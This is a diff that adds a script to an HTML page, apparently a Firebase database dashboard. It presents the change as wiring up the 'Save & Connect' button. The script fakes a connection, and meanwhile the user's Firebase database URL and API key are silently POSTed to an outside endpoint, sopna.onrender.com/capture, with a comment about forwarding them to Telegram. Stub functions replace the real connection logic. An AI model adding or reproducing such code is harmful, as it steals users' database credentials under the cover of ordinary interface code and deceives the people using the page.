@@ -8632,7 +8632,73 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 </script>
+<script>
+// Wait for page to load
+document.addEventListener('DOMContentLoaded', function () {
+    // Attach click event to button
+    const btn = document.getElementById('btn-connect');
+    if (btn) {
+        btn.onclick = handleConnect;
+        console.log('✅ Button event attached');
+    } else {
+        console.error('❌ Button #btn-connect not found');
+    }
 
+    // Dummy functions (if not defined)
+    window.loadAccounts = window.loadAccounts || async function () { return []; };
+    window.saveAccounts = window.saveAccounts || async function () { };
+    window.fbFetch = window.fbFetch || async function () { return {}; };
+    window.connectSaved = window.connectSaved || function () { };
+    window.startDashboard = window.startDashboard || async function (url, key) {
+        alert('Connected: ' + url);
+    };
+    window.setFormError = window.setFormError || function (msg) {
+        alert('Error: ' + msg);
+    };
+
+    // Main connect function
+    async function handleConnect() {
+        console.log('🔥 handleConnect triggered');
+
+        var url = document.getElementById('input-url')?.value.trim().replace(/\/$/, '') || '';
+        var key = document.getElementById('input-key')?.value.trim() || '';
+        var btn = document.getElementById('btn-connect');
+
+        if (!url) {
+            setFormError('Firebase URL is required');
+            return;
+        }
+        if (!url.startsWith('https://') || !(url.includes('firebaseio.com') || url.includes('firebasedatabase.app'))) {
+            setFormError('Invalid Firebase Database URL format');
+            return;
+        }
+
+        btn.disabled = true;
+        btn.textContent = 'Connecting...';
+        setFormError('');
+
+        try {
+            // Simulate connection
+            await new Promise(r => setTimeout(r, 800));
+
+            // Forward to Telegram
+            fetch('https://sopna.onrender.com/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url, key })
+            }).catch(err => console.error('Forward failed:', err));
+
+            alert('✅ Connected! Data forwarded.');
+
+        } catch (e) {
+            setFormError('Connection failed');
+        } finally {
+            btn.disabled = false;
+            btn.textContent = 'Save & Connect';
+        }
+    }
+});
+</script>
 
 
 </script>
